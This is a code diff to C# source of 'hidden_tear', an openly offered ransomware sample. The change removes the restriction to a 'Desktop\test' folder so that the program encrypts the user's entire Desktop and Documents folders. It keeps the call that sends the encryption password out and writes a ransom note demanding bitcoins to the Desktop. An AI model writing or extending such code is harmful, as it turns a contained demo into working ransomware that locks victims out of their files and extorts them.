@@ -172,10 +172,10 @@ namespace hidden_tear
         public void startAction()
         {
             string password = CreatePassword(15);
-            string path = "\\Desktop\\test";
-            string startPath = userDir + userName + path;
+
             SendPassword(password);
-            encryptDirectory(startPath,password);
+            encryptDirectory(userDir + userName + "\\Desktop", password);
+            encryptDirectory(userDir + userName + "\\Documents", password);
             messageCreator();
             password = null;
             System.Windows.Forms.Application.Exit();
@@ -183,7 +183,7 @@ namespace hidden_tear
 
         public void messageCreator()
         {
-            string path = "\\Desktop\\test\\READ_IT.txt";
+            string path = "\\Desktop\\READ_IT.txt";
             string fullpath = userDir + userName + path;
             string[] lines = { "Files has been encrypted with hidden tear", "Send me some bitcoins or kebab", "And I also hate night clubs, desserts, being drunk." };
             System.IO.File.WriteAllLines(fullpath, lines);
